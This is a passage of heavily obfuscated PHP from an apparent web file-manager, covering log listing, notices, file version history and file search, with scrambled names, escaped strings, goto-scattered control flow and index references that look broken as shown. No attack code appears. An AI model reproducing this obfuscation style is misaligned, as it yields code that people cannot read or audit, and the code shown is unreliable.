$FÍ; goto ä́ġ; a펠: $Aԅ =& $_SERVER[]; if (!$bʃ̵) { show_json(array()); } $F읰Ѿ = array(); goto d߰; ä́ġ: } private function ipAddress(&$d) { $dՈ =& $_SERVER[]; if (!empty($d[$dՈ[2099]])) { $a = IpLocation::get($d[$dՈ[2099]]); } else { $a = LNG($dՈ[2102]); } $d[$dՈ[2103]] = $a; } private function descZipDownload($B͞, &$dł) { $Bح =& $_SERVER[]; if (!isset($B͞[$Bح[2104]])) { return; } $d̂ʰ = json_decode($B͞[$Bح[2104]], !0); foreach ($d̂ʰ as $e) { try { $eؿɥ = IO::infoFull($e[$Bح[76]]); } catch (Exception $eъ) { continue; } $B͞[$Bح[76]] = $e[$Bح[76]]; $dł[] = $B͞[$Bح[395]] = $eؿɥ[$Bح[395]]; $dł[] = $B͞[$Bح[1915]] = $eؿɥ[$Bح[478]]; break; } return $B͞; } private function getSourceList(&$A䪜) { $a߮ɘ =& $_SERVER[]; $E = array(); foreach ($A䪜 as $fÛͺ => $cЮ䤋) { goto fߋ; D畝: $E[] = $e֪[$a߮ɘ[395]]; $E[] = $e֪[$a߮ɘ[1915]]; if ($e֪[$a߮ɘ[29]] == $a߮ɘ[520]) { $E[] = $e֪[$a߮ɘ[431]][$a߮ɘ[1062]]; $E[] = $e֪[$a߮ɘ[431]][$a߮ɘ[1063]]; } goto B; fߋ: $e֪ = json_decode($cЮ䤋[$a߮ɘ[431]], !0); if ($cЮ䤋[$a߮ɘ[29]] == $a߮ɘ[1672]) { $e֪ = $this->descZipDownload($e֪, $E); $A䪜[$fÛͺ][$a߮ɘ[431]] = json_encode($e֪); continue; } if (strpos($cЮ䤋[$a߮ɘ[29]], $a߮ɘ[1916]) !== 0) { if (!isset($e֪[$a߮ɘ[76]]) || strpos($cЮ䤋[$a߮ɘ[29]], $a߮ɘ[2105]) !== 0) { continue; } try { $c = IO::infoFull($e֪[$a߮ɘ[76]]); } catch (Exception $BƟʲ) { continue; } $E[] = $e֪[$a߮ɘ[395]] = $c[$a߮ɘ[395]]; $E[] = $e֪[$a߮ɘ[1915]] = $c[$a߮ɘ[478]]; $A䪜[$fÛͺ][$a߮ɘ[431]] = json_encode($e֪); continue; } goto D畝; B: if ($e֪[$a߮ɘ[29]] == $a߮ɘ[1923]) { $E[] = $e֪[$a߮ɘ[431]][$a߮ɘ[395]]; } goto Aҽ; Aҽ: } if (!$E) { return array(); } return Model($a߮ɘ[796])->sourceListInfo($E, !0); } private function logList($EΎ) { goto aĴ; a: return $A; goto F; eٔ: $Eި = $this->getSourceList($EΎ); $FĨ = $this->typeAll(); $A = array(); goto AςЛ; AςЛ: $bՑ = array(); foreach ($EΎ as $Fλ => $Fɣם) { goto Aև; Aև: $B = $Fɣם[$F۩[29]]; $d = isset($d[$Fɣם[$F۩[1533]]]) ? $d[$Fɣם[$F۩[1533]]] : !1; $Fܨ = strpos($B, $F۩[2106]) === 0 ? LNG($F۩[2107]) : LNG($F۩[2102]); goto fō; cЌ: $this->ipAddress($Fɣם); if (strpos($B, $F۩[1916]) === 0 || isset($c[$F۩[1915]])) { goto bοõ; bοõ: $c[$F۩[85]] = $Eި[$c[$F۩[395]]]; $c[$F۩[1928]] = $Eި[$c[$F۩[1915]]]; if ($c[$F۩[29]] == $F۩[520]) { $c[$F۩[431]][$F۩[1062]] = $Eި[$c[$F۩[431]][$F۩[1062]]]; $c[$F۩[431]][$F۩[1063]] = $Eި[$c[$F۩[431]][$F۩[1063]]]; } goto F資Ǿ; Eك: if ($c[$F۩[1928]] && $c[$F۩[1928]][$F۩[404]] == $F۩[1178]) { $bՑ[] = $Fɣם[$F۩[393]]; unset($EΎ[$Fλ]); continue; } goto f뎺; F資Ǿ: if ($c[$F۩[29]] == $F۩[1923]) { $c[$F۩[431]][$F۩[395]] = $Eި[$c[$F۩[431]][$F۩[395]]]; } if ($c[$F۩[29]] == $F۩[1667]) { $c[$F۩[1928]] = $c[$F۩[85]]; $c[$F۩[1915]] = $c[$F۩[1928]][$F۩[395]]; $c[$F۩[85]] = !1; $c[$F۩[395]] = $F۩[33]; } if ($c[$F۩[85]] && $c[$F۩[85]][$F۩[404]] == $F۩[1178]) { $bՑ[] = $Fɣם[$F۩[393]]; unset($EΎ[$Fλ]); continue; } goto Eك; f뎺: } $Fɣם[$F۩[431]] = $c; goto b鎌ա; b鎌ա: unset($Fɣם[$F۩[2108]]); $A[] = $Fɣם; goto F㹱; D: $Fɣם[$F۩[1858]] = $d; $c = json_decode($Fɣם[$F۩[431]], !0); $Fɣם[$F۩[2099]] = isset($c[$F۩[2099]]) ? $c[$F۩[2099]] : $F۩[33]; goto cЌ; fō: $Fɣם[$F۩[28]] = isset($d[$F۩[28]]) ? $d[$F۩[28]] : LNG($F۩[2102]); $Fɣם[$F۩[1965]] = isset($d[$F۩[1965]]) ? $d[$F۩[1965]] : $F۩[33]; $Fɣם[$F۩[1439]] = isset($FĨ[$B]) ? $FĨ[$B] : $Fܨ; goto D; F㹱: } $this->clearSystemPathLog($bՑ); goto a; aĴ: $F۩ =& $_SERVER[]; $d⪺ = array_to_keyvalue($EΎ, $F۩[33], $F۩[1533]); $d = Model($F۩[506])->userListInfo(array_unique($d⪺)); goto eٔ; F: } private function clearSystemPathLog($E) { $AѲ =& $_SERVER[]; if (count($E) == 0) { return; } $bВ뒱 = array($AѲ[393] => array($AѲ[7], array_unique($E))); $this->where($bВ뒱)->delete(); } public function deviceList($cȷ, $eĲ = 0) { $e =& $_SERVER[]; $b = array($e[1533] => $cȷ, $e[194] => array($e[978], $eĲ), $e[29] => $e[1641]); $Dɋ = array(); $d = $this->field($e[2109])->where($b)->order($e[1926])->limit(50)->select(); foreach ($d as $c᙭ => $b) { goto fҵ; fҵ: if ($c᙭ > 0 && abs($b[$e[194]] - $d[$c᙭ - 1][$e[194]]) < 5) { continue; } $C˖ = json_decode($b[$e[431]], !0); $b[$e[2099]] = isset($C˖[$e[2099]]) ? $C˖[$e[2099]] : $e[33]; goto dçҧ; c: $this->ipAddress($b); $b[$e[431]] = $C˖; $Dɋ[$b̵] = $b; goto bԍſ; dçҧ: unset($C˖[$e[2099]]); $b̵ = $this->deviceType($C˖[$e[1917]]); if (isset($Dɋ[$b̵])) { continue; } goto c; bԍſ: } return array_values($Dɋ); } public function deviceType($Cļɝ؂) { return $Cļɝ؂; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\x6e\x6f\x74\x69\143\x65\114\151\163\x74"; public $field = array("\156\x61\155\145", "\x63\x6f\156\x74\x65\x6e\x74", "\x61\x75\164\x68", "\x6d\157\144\145", "\x74\x69\155\145", "\x74\x79\160\145", "\154\x65\x76\x65\x6c", "\145\x6e\141\142\154\145", "\x73\157\x72\x74"); public function listData($a೾ = false, $Dё = "\x73\x6f\162\x74", $dН = false) { return parent::listData($a೾, $Dё, $dН); } public function add($Dꞣ) { $c򼑄ܸ =& $_SERVER[]; $C桎ϴ = time(); if ($Dꞣ[$c򼑄ܸ[12]] == $c򼑄ܸ[2110]) { $C桎ϴ = strtotime($Dꞣ[$c򼑄ܸ[197]]); } $Dꞣ[$c򼑄ܸ[197]] = $C桎ϴ; return parent::insert($Dꞣ); } public function update($b, $E) { goto F׃; C֖: $c쎯ڨ = time(); if ($E[$fń[12]] == $fń[2110]) { $c쎯ڨ = strtotime($E[$fń[197]]); } $E[$fń[197]] = $c쎯ڨ; goto bՋ; F׃: $fń =& $_SERVER[]; $Fڤ = $this->listData($b); if (!$Fڤ) { return !1; } goto C֖; bՋ: return parent::update($b, $E); goto f; f: } public function remove($A) { $B͟ = $this->listData($A); if (!$B͟ || $B͟[$_SERVER[][1178]]) { return !1; } return parent::remove($A); } public function sort($BČ΅, $f) { return parent::update($BČ΅, $f); } public function enable($Eҗ, $bﭗͳ) { return parent::update($Eҗ, array($_SERVER[][2111] => $bﭗͳ)); } private function initUserOption() { $dШ =& $_SERVER[]; $this->optionType = $dШ[2112]; $this->modelType = $dШ[2113]; $this->field = array($dШ[2114], $dШ[28], $dШ[197], $dШ[29], $dШ[2115], $dШ[716], $dШ[189]); } public function userNoticeGet($a = false) { $this->initUserOption(); return parent::listData($a, $_SERVER[][393], !0); } public function userNoticeAdd($b) { $CՃ =& $_SERVER[]; $this->initUserOption(); $d߱Ň = $this->findByKey($CՃ[2114], $b[$CՃ[393]]); if ($d߱Ň) { return !0; } $c = array($CՃ[2114] => $b[$CՃ[393]], $CՃ[28] => $b[$CՃ[28]], $CՃ[197] => $b[$CՃ[197]], $CՃ[29] => isset($b[$CՃ[29]]) ? $b[$CՃ[29]] : 1, $CՃ[2115] => isset($b[$CՃ[2115]]) ? $b[$CՃ[2115]] : 0, $CՃ[716] => 0, $CՃ[189] => 0); return parent::insert($c); } public function userNoticeEdit($D͊, $f㌴) { $this->initUserOption(); return parent::update($D͊, $f㌴); } } goto A; e޺: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\x72\x63\x65\x5f\150\x69\x73\164\157\162\x79"; public function historyCount($F٧) { goto Eʄ; FԽ: return array_to_keyvalue($Bː, $bГΆ[395], $bГΆ[480]); goto BЇ; Aė: $F󻇤 = array($bГΆ[395], $bГΆ[1733] => $bГΆ[480]); $fʈ = array($bГΆ[395] => array($bГΆ[7], $F٧)); $Bː = $this->field($F󻇤)->where($fʈ)->group($bГΆ[395])->select(); goto FԽ; Eʄ: $bГΆ =& $_SERVER[]; if (!$F٧) { return array(); } if (is_string($F٧) || is_int($F٧)) { $F٧ = array($F٧); } goto Aė; BЇ: } public function addHistory($c׮, $dӥǢ = '') { $BԵ =& $_SERVER[]; $Bϕ爄 = array($BԵ[410] => $c׮[$BԵ[395]], $BԵ[1525] => isset($c׮[$BԵ[434]]) ? $c׮[$BԵ[434]] : $c׮[$BԵ[432]], $BԵ[448] => $c׮[$BԵ[447]], $BԵ[548] => $c׮[$BԵ[78]], $BԵ[1929] => $dӥǢ); $Aӭ = $GLOBALS[$BԵ[6]][$BԵ[88]][$BԵ[1111]]; if ($Aӭ > 1) { $this->historyAutoClear($Bϕ爄[$BԵ[395]]); $this->add($Bϕ爄); } Hook::trigger($BԵ[1930], $Bϕ爄); Model($BԵ[1931])->eventFileEdit($c׮[$BԵ[395]]); } private function historyAutoClear($f䞰) { goto bŅ; bŅ: $Dă¦ =& $_SERVER[]; $F = Model($Dă¦[736])->get($Dă¦[1133]); $a֦߻ = $GLOBALS[$Dă¦[6]][$Dă¦[88]][$Dă¦[1111]]; goto b쉔; DЊ: $this->where($cӋ)->delete(); Model($Dă¦[450])->remove($AҢК); goto D͘ʿ; C: $C = array_to_keyvalue($b, $Dă¦[33], $Dă¦[393]); $C = array_slice($C, $AѴ); $AҢК = array_to_keyvalue($b, $Dă¦[33], $Dă¦[447]); goto FӆΩ; DĆ: $cӋ = array($Dă¦[410] => $f䞰); $b = $this->field($Dă¦[1932])->where($cӋ)->order($Dă¦[1926])->select(); if (!$b || $AѴ >= count($b)) { return; } goto C; FӆΩ: $AҢК = array_slice($AҢК, $AѴ); if (!$C || !$AҢК) { return; } $cӋ = array($Dă¦[412] => array($Dă¦[7], $C)); goto DЊ; b쉔: $AѴ = $F == $Dă¦[1134] ? 5 : $a֦߻; if ($a֦߻ <= 1) { $AѴ = 1; } if ($AѴ >= 500) { return; } goto DĆ; D͘ʿ: } public function listData($eÒ) { goto d閉; f儐: $a = 5; if ($fʤ == $bӬҬ[1134]) { $E﯌[$bӬҬ[367]] = array_slice($E﯌[$bӬҬ[367]], 0, $a); $E﯌[$bӬҬ[364]] = array($bӬҬ[1934] => 1, $bӬҬ[1935] => 20, $bӬҬ[1936] => 1, $bӬҬ[1937] => count($E﯌[$bӬҬ[367]])); } return $E﯌; goto dݨ; Aڐ: $E﯌ = $this->field($e)->where($Aǒ)->order($bӬҬ[1926])->selectPage(); $this->_listAppendUser($E﯌[$bӬҬ[367]]); $fʤ = Model($bӬҬ[736])->get($bӬҬ[1133]); goto f儐; d閉: $bӬҬ =& $_SERVER[]; $Aǒ = array($bӬҬ[410] => $eÒ); $e = $bӬҬ[1933]; goto Aڐ; dݨ: } protected function _listAppendUser(&$c躬) { $BϨМ =& $_SERVER[]; $d = array_to_keyvalue($c躬, $BϨМ[33], $BϨМ[1533]); $f = Model($BϨМ[506])->userListInfo($d); foreach ($c躬 as &$Dәި֔) { $Bҋ = $Dәި֔[$BϨМ[1533]]; $Dәި֔[$BϨМ[432]] = $f[$Bҋ] ? $f[$Bҋ] : !1; } unset($Dәި֔); } public function fileInfo($fݣ) { $dϣ鉊 =& $_SERVER[]; $a圮 = $this->tablePrefix; $Aۯڠ = "{$a圮}\x69\x6f\x5f\x66\x69\x6c\x65\x20\146\x69\x6c\145\163\x20\x6f\x6e\x20\x66\151\154\145\163\x2e\x66\x69\x6c\x65\111\x44\40\x3d\x20\x68\151\163\164\x6f\x72\171\x2e\x66\151\x6c\145\x49\104"; return $this->alias($dϣ鉊[1938])->where(array($dϣ鉊[412] => $fݣ))->join($Aۯڠ, $dϣ鉊[1939])->find(); } public function removeItem($BϪ˗) { $fǗΥ =& $_SERVER[]; $Cޗ = array($fǗΥ[412] => $BϪ˗); $EĒЊ = $this->where($Cޗ)->find(); if ($EĒЊ) { $BϪ = $this->where($Cޗ)->delete(); Model($fǗΥ[450])->remove($EĒЊ[$fǗΥ[447]]); return $BϪ; } return !1; } public function removeBySource($c) { goto fϼς; B鉕: return !0; goto B; fϼς: $Dӆ =& $_SERVER[]; if (!$c) { return !1; } if (!is_array($c)) { $c = array($c); } goto c; c: $e = array($Dӆ[410] => array($Dӆ[7], $c)); $Eܓ = $this->field($Dӆ[448])->where($e)->select(); if ($Eܓ) { $this->where($e)->delete(); $F = array_to_keyvalue($Eܓ, $Dӆ[33], $Dӆ[447]); Model($Dӆ[450])->remove($F); } goto B鉕; B: } public function setDetail($Eٔ, $bൄ) { $d =& $_SERVER[]; return $this->where(array($d[412] => $Eٔ))->save(array($d[1929] => $bൄ)); } public function rollbackToItem($D҃, $eȆ) { goto f; eȇ: $eƥ = $this->find($eȆ); $F = array($b斣[447] => $eƥ[$b斣[447]], $b斣[78] => $eƥ[$b斣[78]], $b斣[84] => time(), $b斣[434] => USER_ID); Model($b斣[796])->where(array($b斣[395] => $D҃))->save($F); goto E؅; f: $b斣 =& $_SERVER[]; $Bݖ = Model($b斣[796])->sourceInfo($D҃); $this->addHistory($Bݖ, LNG($b斣[1940])); goto eȇ; E؅: return $this->where(array($b斣[412] => $eȆ))->delete(); goto aƿ; aƿ: } public function clearSame($a) { goto E; f䊧: $a쓲 = array(); $eޚ = array(); foreach ($D֦ as $e) { if (!$e || count($e) <= 1) { continue; } foreach ($e as $B) { $a쓲[] = $B[$F؂[447]]; $eޚ[] = $B[$F؂[393]]; } } goto bĊ; E: $F؂ =& $_SERVER[]; $eЯ = $this->listData($a); $D֦ = array_to_keyvalue_group($eЯ, $F؂[447]); goto f䊧; bĊ: if (!$eޚ) { return; } $this->where(array($F؂[393] => array($F؂[7], $eޚ)))->delete(); Model($F؂[450])->remove($a쓲); goto Cڧ; Cڧ: } public function userSpace() { $cͼѨ܇ =& $_SERVER[]; $cՠ = $this->tablePrefix; $b = array($cͼѨ܇[1525] => USER_ID); $B֌ = "{$cՠ}\151\x6f\137\x66\151\x6c\145\x20\146\151\x6c\145\x73\40\157\156\x20\146\x69\154\x65\x73\x2e\146\x69\154\x65\111\104\40\75\40\150\x69\163\164\157\x72\x79\56\146\x69\154\x65\111\x44"; return $this->alias($cͼѨ܇[1938])->where($b)->join($B֌, $cͼѨ܇[1939])->sum($cͼѨ܇[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($D؄) { goto Cϕ; Cϕ: $DǞ =& $_SERVER[]; $EЃ = KodIO::fileTypeList(); $aýʌǔ = $EЃ[$D؄]; goto DÞ҈; DÞ҈: if (!$aýʌǔ) { return array(); } $c = $aýʌǔ[$DǞ[168]]; $Dߌٷ = $DǞ[7]; goto D粹; D粹: if (!$aýʌǔ[$DǞ[168]]) { $Fߠ = array_to_keyvalue($EЃ, $DǞ[33], $DǞ[168]); $c = implode($DǞ[47], $Fߠ); $Dߌٷ = $DǞ[1941]; } $E頎 = explode($DǞ[47], trim($c, $DǞ[47])); return array($Dߌٷ, $E頎); goto F򟉶; F򟉶: } public function listPathType($E탆) { $A࿻ =& $_SERVER[]; $a = $this->fileTypeWhere($E탆); if (!$a) { return array(); } $a = array($A࿻[549] => SourceModel::TYPE_USER, $A࿻[550] => USER_ID, $A࿻[546] => 0, $A࿻[547] => $a); return $this->listSource($a); } public function listSearch($B, $b = 300) { goto bÃ֧ߌ; c򅈯: if (!isset($F[$d[423]])) { $F[$d[423]] = 0; } $FՍ = $d[1943]; $f̔к = $FՍ; goto b; bÃ֧ߌ: $d =& $_SERVER[]; if (isset($B[$d[1784]]) && $B[$d[1784]]) { $B[$d[1784]] = str_replace($d[381], $d[1942], trim($B[$d[1784]])); } $F = $this->_parseSearchWhere($B); goto c򅈯; a̡Í: $this->_listSearchTag($C߰, $B, $f̔к); $this->_listSearchGroupTag($C߰, $B, $f̔к); $this->_listDataApply($C߰[$d[367]]); goto D뻞; Fܭ: $C߰ = $this->distinct(!0)->field($FՍ)->where($F)->selectPage($b); $this->_listSearchFileContent($C߰, $B, $f̔к); $this->_listSearchDesc($C߰, $B, $f̔к); goto a̡Í; D뻞: $this->_listMake($C߰); return $C߰; goto Aڊ׼; b: $this->_listSearchBindPinyin($B, $F, $FՍ); $this->alias($d[516])->_makeOrder(); $F = $this->parseWhereLike($F); goto Fܭ; Aڊ׼: } private function _listSearchFileContent(&$f΂, $EҸ, $C劐) { goto Fصד; CƷ: if (!isset($e惭[$c᥶֎[28]]) || !is_array($EҸ[$c᥶֎[447]])) { return; } $e惭[$c᥶֎[447]] = array($c᥶֎[7], $EҸ[$c᥶֎[447]]); unset($e惭[$c᥶֎[28]]); goto D莊; Fصד: $c᥶֎ =& $_SERVER[]; if (!$EҸ[$c᥶֎[1784]] || $f΂[$c᥶֎[364]][$c᥶֎[351]] > 1) { return; } $e惭 = $this->_parseSearchWhere($EҸ); goto CƷ; D莊: unset($EҸ[$c᥶֎[447]]); $C = $this->field($C劐)->where($e惭)->limit($c᥶֎[1944])->select(); if (!$C || count($C) == 0) { return; } goto cф; cф: $f΂[$c᥶֎[367]] = array_merge($C, $f΂[$c᥶֎[367]]); $f΂[$c᥶֎[364]][$c᥶֎[365]] += count($C); goto e; e: } private function _listSearchTag(&$Dմ۽, $c¿, $F) { goto a; b¾Є: if (!$F) { return; } $C = array($a؊[419] => array($a؊[7], $F), $a؊[1533] => USER_ID); $FǮŉ = Model($a؊[420])->field($a؊[76])->where($C)->select(); goto Fĝ; Fĝ: $FǮŉ = array_to_keyvalue($FǮŉ, $a؊[33], $a؊[76]); $f֝ݣ = array_unique($FǮŉ); $this->_listSearchMerge($Dմ۽, $c¿, $F, $f֝ݣ); goto f; a: $a؊ =& $_SERVER[]; if (!$c¿[$a؊[1784]] || $Dմ۽[$a؊[364]][$a؊[351]] > 1) { return; } $b = Model($a؊[1945])->listData(); goto A; A: $F = array(); $fȡ = $c¿[$a؊[1784]]; foreach ($b as $DԨ) { $FǤ = $DԨ[$a؊[28]]; $Fȉ = str_replace($a؊[50], $a؊[33], Pinyin::encode($FǤ)); if (stripos($FǤ, $fȡ) !== !1 || stripos($Fȉ, $fȡ) !== !1) { $F[] = $DԨ[$a؊[393]]; } } goto b¾Є; f: } private function _listSearchDesc(&$d綸ﮌ, $fˤ, $E) { goto B; DĨڑ: $Bȍ = Model($b[532])->field($b[395])->where($e盹곇)->select(); $c = array_to_keyvalue($Bȍ, $b[33], $b[395]); $this->_listSearchMerge($d綸ﮌ, $fˤ, $E, $c); goto Aаԉ; B: $b =& $_SERVER[]; if (!$fˤ[$b[1784]] || $d綸ﮌ[$b[364]][$b[351]] > 1) { return; } $dꐃ = $this->listSearchChildren($fˤ[$b[478]]); goto e˿; e˿: $dꐃ = array_unique($dꐃ); if (!$dꐃ) { return; } $e盹곇 = array($b[395] => array($b[7], $dꐃ), $b[93] => $b[431], $b[372] => array($b[380], $b[1786] . $fˤ[$b[1784]] . $b[1786])); goto DĨڑ; Aаԉ: } private function _listSearchGroupTag(&$f, $E, $c) { goto BԱ; F: $C = array(); $c = $E[$Aʖ[1784]]; foreach ($Dʽ[$Aʖ[367]] as $Bº) { $Bɂʷ = $Bº[$Aʖ[28]]; $fô = str_replace($Aʖ[50], $Aʖ[33], Pinyin::encode($Bɂʷ)); if (stripos($Bɂʷ, $c) !== !1 || stripos($fô, $c) !== !1) { $C[] = $Bº[$Aʖ[393]]; } } goto aΡ; F㹕: if (!$E߅Λ || $E߅Λ[$Aʖ[404]] != SourceModel::TYPE_GROUP) { return; } $bӳչ߾ = $E߅Λ[$Aʖ[484]]; $Dʽ = Model($Aʖ[1946])->get($bӳչ߾); goto F; BԱ: $Aʖ =& $_SERVER[]; if (!$E[$Aʖ[1784]] || $f[$Aʖ[364]][$Aʖ[351]] > 1 || !$E[$Aʖ[478]]) { return; } $E߅Λ = $this->sourceInfo($E[$Aʖ[478]]); goto F㹕; Eԛ: $bמ = array_to_keyvalue($bמ, $Aʖ[33], $Aʖ[76]); $dֱޔ = array_unique($bמ); $this->_listSearchMerge($f, $E, $c, $dֱޔ); goto f臈; aΡ: if (!$C) { return; } $b狔 = array($Aʖ[419] => array($Aʖ[7], $C), $Aʖ[1533] => 0, $Aʖ[29] => $Aʖ[1808] . $bӳչ߾); $bמ = Model($Aʖ[420])->field($Aʖ[76])->where($b狔)->select(); goto Eԛ; f臈: } private function _listSearchMerge(&$Eڝ, $eދ, $F, $cЄҸ) { goto D􌖲; EⅨ: $bҗ = array_diff($cЄҸ, $A°̅); if (!$bҗ) { return; } $D = array($eØ[395] => array($eØ[7], $bҗ)); goto Dʓ; D􌖲: $eØ =& $_SERVER[]; if (!$cЄҸ) { return; } $A°̅ = array_to_keyvalue($Eڝ[$eØ[367]], $eØ[33], $eØ[395]); goto EⅨ; d: foreach ($d as $d̶) { if ($this->_listSearchFilter($d̶, $eދ)) { $aؼ[] = $d̶; } } $Eڝ[$eØ[367]] = array_merge($aؼ, $Eڝ[$eØ[367]]); $Eڝ[$eØ[364]][$eØ[365]] += count($aؼ); goto Dڱ; Dʓ: $d = $this->field($F)->where($D)->select(); if (!$d) { return; } $aؼ = array(); goto d; Dڱ: } private function _listSearchFilter($fۑ, $cǄՖ) { goto A; Bל: if (isset($cǄՖ[$c[562]]) && $cǄՖ[$c[562]] != $fۑ[$c[434]]) { return !1; } return !0; goto D팿Ө; d: if (isset($cǄՖ[$c[405]]) && $cǄՖ[$c[405]] != $c[1751]) { if ($cǄՖ[$c[405]] == $c[77] && !$f) { return !1; } if ($cǄՖ[$c[405]] != $c[77] && $f) { return !1; } if (!strstr($fۑ[$c[168]], $c[47] . $cǄՖ[$c[405]] . $c[47])) { return !1; } } if (isset($cǄՖ[$c[1947]]) && $cǄՖ[$c[1947]] < $fۑ[$c[78]]) { return !1; } if (isset($cǄՖ[$c[1948]]) && $cǄՖ[$c[1948]] > $fۑ[$c[78]]) { return !1; } goto Bל; A: $c =& $_SERVER[]; $f = $fۑ[$c[403]] == $c[87]; if (!strstr($fۑ[$c[487]], $c[47] . $cǄՖ[$c[478]] . $c[47])) { return !1; } goto d; D팿Ө: } public function listSearchChildren($b, $Aؔ = 5000) { goto A; F㕆: $bṞ̏ = array($C榚[487] => array($C榚[380], $c[$C榚[487]] . $c[$C榚[395]] . $C榚[513])); $e֕ = $this->field($C榚[395])->cache(null, 600)->where($bṞ̏)->count(); if ($e֕ > $Aؔ) { return $this->_listSearchChildrenNear($b, $Aؔ); } goto D; D: $dϵ = $this->field($C榚[395])->where($bṞ̏)->select(); $b = array_to_keyvalue($dϵ, $C榚[33], $C榚[395]); return $b; goto Eꭃ; A: $C榚 =& $_SERVER[]; $b = array(); $c = $this->sourceInfo($b); goto F㕆; Eꭃ: } private function _listSearchChildrenNear($C, $Cǻ) { goto Aˬ; Aˬ: $DǕ =& $_SERVER[]; $eϞǌ = array(); $dӃ = array($DǕ[478] => $C); goto B; c: if (!$f𝷸) { return $eϞǌ; } $dӃ = array($DǕ[478] => array($DǕ[7], $f𝷸)); $AԢة = $this->field($DǕ[1949])->where($dӃ)->limit($Cǻ)->select(); goto a; B: $AԢة = $this->field($DǕ[1949])->where($dӃ)->select(); $f𝷸 = array_to_keyvalue(array_filter_by_field($AԢة, $DǕ[403], $DǕ[87]), $DǕ[33], $DǕ[395]); $eϞǌ = array_merge($eϞǌ, array_to_keyvalue($AԢة, $DǕ[33], $DǕ[395])); goto c; a: $eϞǌ = array_merge($eϞǌ, array_to_keyvalue($AԢة, $DǕ[33], $DǕ[395])); $eϞǌ = array_slice($eϞǌ, 0, $Cǻ); return $eϞǌ; goto Ě; Ě: } private function _listSearchBindPinyin($C۠, &$a, &$b) { goto Eբ; Eբ: $E =& $_SERVER[]; if (!isset($C۠[$E[1784]]) || !$C۠[$E[1784]]) { return; } if (!Input::check($C۠[$E[1784]], $E[316]) || strlen($C۠[$E[1784]]) < 2) { return; } goto C; a썠: foreach ($a as $e => $C˛) { $Eѩ[$E[1951] . $e] = $C˛; } foreach ($c as $dƪۇÝ) { $Eѩ[] = array($E[1953] => $dƪۇÝ, $E[964] => $E[1788], array($E[1954] => $dƪۇÝ, $E[1955] => array($E[7], array($E[444], $E[443])))); } $this->join($b); goto d; d: $a = $Eѩ; goto d芙; Fم: $b = $E[1951] . str_replace($E[47], $E[1952], $b); $c = $a[$E[28]]; unset($a[$E[28]]); goto a썠; C: $b = "\x4c\x45\x46\124\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\151\x6f\x5f\163\157\x75\x72\143\145\x5f\155\x65\x74\141\40\155\145\x74\141\x20\x6f\x6e\x20\163\157\165\x72\143\145\x2e\x73\x6f\165\x72\143\x65\111\104\x20\75\x20\155\x65\x74\x61\56\x73\x6f\x75\162\x63\145\x49\x44"; $Eѩ = array(); $b = str_replace(array($E[229], $E[50], $E[1950]), $E[33], $b); goto Fم; d芙: } private function _parseSearchWhere($bڊ) { goto d莬څ; F: if (isset($bڊ[$bҿ[562]]) && $bڊ[$bҿ[562]]) { $AĻɈ[] = array($bҿ[434] => $bڊ[$bҿ[562]], $bҿ[432] => $bڊ[$bҿ[562]], $bҿ[964] => $bҿ[1788]); } if (isset($bڊ[$bҿ[405]]) && $bڊ[$bҿ[405]]) { $f䊸 = $bڊ[$bҿ[405]]; if ($f䊸 == $bҿ[77]) { $AĻɈ[$bҿ[403]] = 1; } else { if ($f䊸 == $bҿ[1959]) { $AĻɈ[$bҿ[403]] = 0; } else { if ($f䊸) { $f䊸 = is_array($f䊸) ? $f䊸 : explode($bҿ[47], $f䊸); $AĻɈ[$bҿ[405]] = array($bҿ[411], $f䊸); $AĻɈ[$bҿ[403]] = 0; } } } } if (isset($bڊ[$bҿ[478]]) && $bڊ[$bҿ[478]]) { $e貐 = $this->sourceInfo($bڊ[$bҿ[478]]); $AĻɈ[$bҿ[553]] = array($bҿ[512], $e貐[$bҿ[487]] . $bڊ[$bҿ[478]] . $bҿ[513]); } goto Dո; d莬څ: $bҿ =& $_SERVER[]; $AĻɈ = array(); if (isset($bڊ[$bҿ[727]]) && $bڊ[$bҿ[727]]) { $AĻɈ[$bҿ[84]] = array($bҿ[1956], $bڊ[$bҿ[727]]); } goto aߦŵ; Dո: if (isset($bڊ[$bҿ[1784]]) && trim($bڊ[$bҿ[1784]])) { $dת = trim($bڊ[$bҿ[1784]]); $E = explode($bҿ[50], $dת); if (strlen($dת) > 2 && (substr($dת, 0, 1) == $bҿ[116] && substr($dת, -1) == $bҿ[116]) || substr($dת, 0, 1) == $bҿ[55] && substr($dת, -1) == $bҿ[55]) { $dת = substr($dת, 1, -1); $E = array($dת); } $AĻɈ[$bҿ[28]] = array(array($bҿ[512], $bҿ[1786] . $dת . $bҿ[1786])); if (count($E) > 1) { $AĻɈ[$bҿ[28]] = array(); foreach ($E as $e) { if (!trim($e)) { continue; } $AĻɈ[$bҿ[28]][] = array($bҿ[512], $bҿ[1786] . trim($e) . $bҿ[1786]); } } } return $AĻɈ; goto eϼ; aߦŵ: if (isset($bڊ[$bҿ[476]]) && $bڊ[$bҿ[476]]) { $BލՆ = array($bҿ[1957], $bڊ[$bҿ[476]]); if ($AĻɈ[$bҿ[84]]) { $AĻɈ[$bҿ[84]] = array($AĻɈ[$bҿ[84]], $BލՆ, $bҿ[1958]); } else { $AĻɈ[$bҿ[84]] = $BލՆ; } } if (isset($bڊ[$bҿ[1947]]) && $bڊ[$bҿ[1947]] > 0) { $AĻɈ[$bҿ[78]] = array($bҿ[1956], $bڊ[$bҿ[1947]]); } if (isset($bڊ[$bҿ[1948]]) && $bڊ[$bҿ[1948]]) { $BލՆ = array($bҿ[1957], $bڊ[$bҿ[1948]]); if ($AĻɈ[$bҿ[78]]) { $AĻɈ[$bҿ[78]] = array($AĻɈ[$bҿ[78]], $BލՆ, $bҿ[1958]); } else { $AĻɈ[$bҿ[78]] = $BލՆ; } } goto F; eϼ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($aʡ) { $D =& $_SERVER[]; $a = Model($D[502])->where(array($D[1525] => $aʡ))->find(); $Aϣ = $this->_mkdirRoot(SourceModel::TYPE_USER, $aʡ, $a[$D[28]]); $this->userDesktopAdd($Aϣ); return $Aϣ; } public function userDesktopAdd($A) { $B =& $_SERVER[]; $Dӳ = LNG($B[1960]); $E = $this->mkdir($A, $Dӳ); $this->metaSet($E, $B[1961], $B[87]); $this->metaSet($A, 